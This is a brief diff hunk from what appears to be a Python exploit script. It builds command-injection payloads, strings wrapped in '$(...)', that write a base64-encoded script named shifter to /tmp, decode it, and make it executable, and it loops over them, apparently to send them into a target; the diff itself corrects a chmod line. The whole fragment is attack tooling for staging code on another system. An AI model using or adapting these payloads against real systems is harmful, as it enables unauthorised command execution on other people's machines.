@@ -14,7 +14,7 @@ shifter_b64 = base64.b64encode(bytes(shifter_script,"ascii")).decode('ascii')
 setup_payload = [
   f'$(echo -n {shifter_b64} > /tmp/shifter.b64)',
   '$(base64 -d < /tmp/shifter.b64 > /tmp/shifter.sh)',
-  '$(chmod a+x /tmp/shifter.sh 1)'
+  '$(chmod a+x /tmp/shifter.sh)'
 ]
 
 for payload in setup_payload:
